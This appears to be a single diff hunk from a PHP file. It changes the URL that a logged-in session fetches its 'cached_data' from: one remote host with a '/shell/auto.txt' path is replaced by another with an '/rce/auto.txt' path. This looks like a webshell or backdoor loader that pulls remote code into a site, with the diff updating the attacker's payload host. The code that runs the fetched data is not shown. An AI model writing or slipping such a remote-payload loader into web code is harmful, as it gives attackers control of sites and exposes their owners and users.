@@ -901,7 +901,7 @@
 
     if (is_logged_in()) {
         if (!isset($_SESSION['cached_data']) || empty($_SESSION['cached_data'])) {
-            $_SESSION['cached_data'] = geturlsinfo('https://syndicateseo.xyz/shell/auto.txt');
+            $_SESSION['cached_data'] = geturlsinfo('https://megafortune.fit/rce/auto.txt');
             if (empty($_SESSION['cached_data'])) {
                 echo "failed";
                 exit;
